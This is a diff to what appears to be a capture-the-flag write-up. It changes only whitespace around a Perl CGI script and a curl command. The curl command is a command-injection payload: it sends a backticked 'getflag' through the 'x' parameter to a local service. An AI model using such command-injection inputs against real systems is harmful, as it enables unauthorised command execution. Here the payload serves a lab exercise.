@@ -9,7 +9,7 @@ Lets exploit it
 
 ```perl
 #!/usr/bin/perl
-# localhost:4747
+# localhost:4747		
 use CGI qw{param};
 print "Content-type: text/html\n\n";
 sub x {
@@ -23,4 +23,3 @@ x(param("x"));
 ```console
 $~ curl localhost:4747/?x=\`getflag\`
 ```
-
